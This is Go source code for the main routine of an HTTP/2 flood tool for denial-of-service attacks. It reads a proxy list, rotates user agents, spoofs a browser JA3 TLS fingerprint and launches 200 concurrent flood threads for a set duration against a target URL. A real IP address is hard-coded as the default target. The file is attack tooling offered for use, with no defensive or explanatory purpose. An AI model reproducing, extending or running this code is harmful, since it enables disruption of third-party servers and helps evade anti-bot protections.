package main

import (
	"fmt"
	"io/ioutil"
	"math/rand"
	"os"
	"strconv"
	"strings"
	"sync"
	"time"
)

var UserAgents = make(map[int]string)
var LoadedProxies = make(map[int]string)
var RsIP int
var ThreadSync sync.WaitGroup

var Sys System

func InitializeUserAgents() {
	for y, x := range Agents {
		UserAgents[y] = x
	}
}

func main() {
	InitializeUserAgents()
	rand.Seed(time.Now().UnixNano())
	//ShareBanner := Parser()
	/*if len(os.Args) < 8 {
		fmt.Println(len(os.Args))
		//fmt.Println(ShareBanner)
		return
	}*/

	//var HTTPVersion string
	//var Url string = "http://also.black/hit" //"http://95.211.208.171"
	Url := "http://95.211.208.171" //"http://88.198.8.149"
	var HTTP_HOST string
	var limit int = 2
	var proxyFile string = "C:/ForTransfering/proxyFile.txt"
	//proxyFile = "proxyFile.txt"
	var fingerprints string = "771,4865-4867-4866-49195-49199-52393-52392-49196-49200-49162-49161-49171-49172-51-57-47-53-10,0-23-65281-10-11-35-16-5-51-43-13-45-28-21,29-23-24-25-256-257,0"
	var threads int = 200
	var mode string = "GET"
	var dur int = 100
	var cookie interface{}
	var data interface{}

	Arguments := os.Args[1:]
	for _, x := range Arguments {
		if strings.Contains(x, "version=") {
			//HTTPVersion = strings.Split(x, "=")[1]
		} else if strings.Contains(x, "url=") {
			Url = strings.Split(x, "=")[1]
		} else if strings.Contains(x, "domain=") {
			HTTP_HOST = strings.Split(x, "=")[1]
		} else if strings.Contains(x, "time=") {
			dur, _ = strconv.Atoi(strings.Split(x, "=")[1])
		} else if strings.Contains(x, "limit=") {
			limit, _ = strconv.Atoi(strings.Split(x, "=")[1])
		} else if strings.Contains(x, "proxyFile=") {
			proxyFile = strings.Split(x, "=")[1]
		} else if strings.Contains(x, "fingerprints=") {
			fingerprints = strings.Split(x, "=")[1]
		} else if strings.Contains(x, "threads=") {
			threads, _ = strconv.Atoi(strings.Split(x, "=")[1])
		} else if strings.Contains(x, "mode=") {
			mode = strings.Split(x, "=")[1]
		} else if strings.Contains(x, "cookie=") {
			cookie = strings.Split(x, "cookie=")[1]
		} else if strings.Contains(x, "data=") {
			data = strings.Split(x, "data=")[1]
		} else {
			if !strings.Contains(x, "cookie=") {
				cookie = nil
			} else if !strings.Contains(x, "data=") {
				data = nil
			}
			//fmt.Println(ShareBanner)
		}
	}
	//fmt.Println(HTTPVersion, Host, HTTP_HOST, limit, threads, mode, cookie, data, list)
	if cookie != nil {
		mode = "POST"
	}

	f, err := os.Open(proxyFile)
	if err != nil {
		fmt.Println("Proxy file does not exist!", err)
		return
	}
	defer f.Close()
	body, err := ioutil.ReadAll(f)
	if err != nil {
		fmt.Println("Can't read Proxy file!")
		return
	}

	parsed := strings.ReplaceAll(string(body), "\r\n", "\n")
	prox := strings.Split(parsed, "\n")
	for i, p := range prox {
		LoadedProxies[i] = p
	}

	New := Attack{
		Url:           Url,
		Host:          HTTP_HOST,
		AttackMethod:  mode,
		PostData:      data,
		RequestsPerIP: limit,
		Cookie:        cookie,
		Ja3:           fingerprints,
	}
	Sys = System{
		//Banner:       ShareBanner,
		HTTP2Timeout: 10000,
		Attack:       &New,
	}

	for x := 0; x < threads; x++ {
		go TLS_HTTP2_ChineseVersion(&ThreadSync)
		//go TLS_HTTP2(&ThreadSync)
		//go HTTP2(&ThreadSync)
		ThreadSync.Add(1)
	}
	//
	ThreadSync.Wait()
	close(start)
	fmt.Println("Started Flood!")
	time.Sleep(time.Duration(dur) * time.Second)
	fmt.Println("end of flood")
}
